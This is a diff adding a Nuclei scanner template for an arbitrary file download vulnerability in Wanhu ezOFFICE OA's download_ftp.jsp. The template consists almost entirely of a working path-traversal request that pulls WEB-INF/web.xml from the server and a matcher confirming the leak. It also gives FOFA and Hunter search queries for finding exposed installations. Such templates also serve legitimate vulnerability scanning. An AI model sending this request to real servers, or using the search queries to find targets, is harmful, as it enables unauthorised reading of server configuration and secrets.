@@ -1,0 +1,34 @@
+id: wanhu-ezoffice-downloadftpjsp-filedownload
+info:
+  name: 万户 ezoffice download_ftp.jsp - filedownload
+  author: leadlife
+  severity: critical
+  description: 万户OA download_ftp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20download_ftp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,filedownload,oa,ezoffice
+
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?xml"
+          - "display-name"
+        condition: and
+
+      - type: status
+        status:
+          - 200
